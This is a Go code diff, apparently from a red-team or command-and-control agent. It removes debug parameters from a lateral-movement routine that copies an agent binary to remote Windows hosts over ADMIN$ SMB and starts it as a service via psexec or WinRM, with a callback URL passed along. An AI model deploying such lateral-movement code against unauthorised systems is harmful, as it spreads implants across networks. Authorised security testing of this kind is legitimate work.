@@ -86,14 +86,10 @@ func lateralMoveWithProgress(payload lateralPayload, publish func(string)) (stri
 		return "", err
 	}
 	localPath := `C:\Windows\System32\` + binaryName
-	agentCommand := lateralAgentCommand(localPath, targetSession, payload.WorkspaceID, serviceName, payload.Debug)
+	agentCommand := lateralAgentCommand(localPath, targetSession, payload.WorkspaceID, serviceName)
 
 	if payload.Method == "psexec" {
 		return lateralPsexecMove(payload, targetSession, serviceName, binaryName, publish)
-	}
-	self, err = resolveDebugAgentExecutable(self, payload.Debug)
-	if err != nil {
-		return "", err
 	}
 
 	// Stage the agent binary through ADMIN$ (SMB write under the active
@@ -109,7 +105,7 @@ func lateralMoveWithProgress(payload lateralPayload, publish func(string)) (stri
 			return "", err
 		}
 	case "winrm":
-		if err := winrmCreateProcess(payload.Host, localPath, targetSession, payload.WorkspaceID, serviceName, payload.Debug); err != nil {
+		if err := winrmCreateProcess(payload.Host, localPath, targetSession, payload.WorkspaceID, serviceName); err != nil {
 			return "", err
 		}
 	}
@@ -139,7 +135,7 @@ func lateralPsexecMove(payload lateralPayload, targetSession, serviceName, binar
 		return "", fmt.Errorf("stage lateral service on %s: %w", payload.Host, err)
 	}
 	localPath := `C:\Windows\System32\` + binaryName
-	binPath := buildWindowsCmdLine(append([]string{localPath}, lateralServiceArguments(payload.Stage, targetSession, cfg.BaseURL, payload.Debug)...))
+	binPath := buildWindowsCmdLine(append([]string{localPath}, lateralServiceArguments(payload.Stage, targetSession, cfg.BaseURL)...))
 	// The service is not marked for deletion here; this caller removes it
 	// below once the linked worker has completed successfully.
 	if err := scmStartService(payload.Host, serviceName, binPath, false); err != nil {
